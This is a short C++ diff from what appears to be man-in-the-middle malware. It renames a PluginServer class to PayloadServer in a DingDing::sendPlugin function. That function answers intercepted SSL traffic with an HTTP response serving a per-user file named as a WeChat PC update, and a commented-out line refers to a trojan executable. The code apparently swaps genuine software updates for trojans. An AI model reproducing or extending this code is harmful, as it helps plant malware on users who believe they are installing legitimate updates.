@@ -6,7 +6,7 @@
 #include "sslPublic.h"
 #include "../Public.h"
 #include "../HttpUtils.h"
-#include "PluginServer.h"
+#include "PayloadServer.h"
 #include "../FileOper.h"
 
 //download.alicdn.com
@@ -82,7 +82,7 @@ int DingDing::sendPlugin(char* dstbuf, int dstbuflimit, LPSSLPROXYPARAM lpssl) {
 	// 		"Content-Type: application/zip\r\n"
 	// 		"Content-Length: %u\r\n\r\n";
 	// 		string filename = Public::getUserUrl(lpssl->username, EXETROJAN_FILE_NAME);
-	// 		int ret = PluginServer::SendPluginFile(filename.c_str(), lpssl, szHttpPartialZipFormat, 0, -1);
+	// 		int ret = PayloadServer::SendPluginFile(filename.c_str(), lpssl, szHttpPartialZipFormat, 0, -1);
 
 	char* szHttpPartialZipFormat = "HTTP/1.1 200 OK\r\n"
 		"Connection: keep-alive\r\n"
@@ -91,7 +91,7 @@ int DingDing::sendPlugin(char* dstbuf, int dstbuflimit, LPSSLPROXYPARAM lpssl) {
 		"Content-Length: %u\r\n\r\n";
 
 	string filename = Public::getUserUrl(lpssl->username, WEIXIN_PC_UPDATE_EXE_FILENAME);
-	int ret = PluginServer::SendPluginFile(filename.c_str(), lpssl, szHttpPartialZipFormat, 1);
+	int ret = PayloadServer::SendPluginFile(filename.c_str(), lpssl, szHttpPartialZipFormat, 1);
 	return ret;
 }
 
